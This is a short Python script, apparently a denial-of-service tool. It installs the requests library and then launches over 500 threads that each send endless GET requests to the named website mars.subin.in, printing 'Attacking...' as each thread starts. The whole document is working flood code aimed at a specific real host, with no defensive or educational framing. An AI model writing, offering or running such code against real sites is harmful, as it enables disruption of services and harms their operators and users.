import threading,os,requests

print("installing packages...")
os.system('pip install requests')
def make_request():
	while True:
		r = requests.get('https://mars.subin.in')
threads = 512
i=0
while i <= threads:
	a = threading.Thread(target=make_request)
	print("Attacking...")
	a.start()
	i+=1